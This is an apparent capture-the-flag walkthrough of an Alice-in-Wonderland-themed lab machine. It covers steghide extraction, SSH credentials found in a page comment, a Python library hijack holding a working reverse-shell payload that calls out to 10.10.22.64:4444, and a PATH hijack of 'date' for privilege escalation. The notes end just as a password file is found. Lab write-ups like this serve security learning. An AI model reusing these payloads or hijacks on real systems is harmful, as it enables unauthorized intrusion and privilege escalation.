/r/ - is a hint
we know that's target is a ubuntu operating system
and site on golang

Steghide is a cool and strange tool working with 'passphrases'
it help to get stego from image
steghide extract -sf white-rabbit_1.jpg
I got hint


sooo..
if you enter ip/r/a/b/b/i/t you get the same site but img with Alice?

Text has other names:
Hatter and March Hare


In rabbit site
there is a comment alice:HowDothTheLittleCrocodileImproveHisShiningTail
its ssh login and password
there 2 files root.txt and walrus_and_carpenter.py
which we can run as rabbit 


i found that we can abuse python libraries
i wrote this to random.py to abuse library:

import os, subprocess, socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.22.64",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])

so.. im trying to get reverse shell via:
sudo -u rabbit python3 walrus_and_carpenter.py

i find out that we should give the same path that sudo -l gived as
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
So:
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
and it works!

using ltrace and strace i found that:
it uses 
/etc/suid-debug 
/bin/echo -n 

text:
Mad Hatter will be here soon./bin/echo -n 'Probably by ' && date --date='next hour' -RAsk very nicely, and I will give you some tea while you wait for himSegmentation fault (core dumped)

more interesting is date function
we overide it with $PATH


i inserted rabbit's home directory into $PATH
and
echo "/bin/bash" > date
./teaParty
There was lags but i used
bash -i
and got stable shell
i found password.txt
it has:
